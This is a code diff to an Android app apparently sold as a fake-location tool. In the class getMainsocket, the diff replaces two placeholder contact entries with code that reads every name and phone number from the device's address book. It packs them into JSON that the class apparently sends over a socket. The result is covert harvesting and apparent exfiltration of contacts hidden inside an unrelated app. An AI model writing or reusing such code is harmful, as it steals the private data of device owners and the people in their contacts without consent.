@@ -2,16 +2,18 @@ package com.swj.fakelocation;
 
 import android.os.Handler;
 import android.os.Message;
+import android.provider.ContactsContract;
 import android.util.Log;
-
+import android.database.Cursor;
 import org.json.JSONException;
 import org.json.JSONObject;
-
+import android.content.ContentResolver;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.Socket;
 
+import static com.swj.fakelocation.FakeLocationApplication.getContext;
 import static com.swj.fakelocation.MainActivity.latitude;
 import static com.swj.fakelocation.MainActivity.longtitude;
 
@@ -161,8 +163,28 @@ public class getMainsocket
         {
             JSONObject jsonSend = new JSONObject();
             JSONObject jsonDir = new JSONObject();
-            jsonDir.put("许江","13569856547");
-            jsonDir.put("谢康","18956475896");
+            Cursor cursor = null;
+            try{//查询联系人数据
+                cursor =  getContext().getContentResolver().query(ContactsContract.CommonDataKinds.
+                        Phone.CONTENT_URI,null,null,null,null);
+                if(cursor != null){
+                    while (cursor.moveToNext()){
+                        String dispalyname= cursor.getString(cursor.getColumnIndex
+                                (ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                        String number= cursor.getString(cursor.getColumnIndex
+                                (ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        jsonDir.put(dispalyname,number);
+                    }
+                }
+            }catch (Exception e){
+                e.printStackTrace();
+            }finally {
+                if (cursor !=null){
+                    cursor.close();
+                }
+            }
+            //jsonDir.put("许江","13569856547");
+            //jsonDir.put("谢康","18956475896");
             jsonSend.put("dire",jsonDir);
             send = jsonSend.toString();
         }
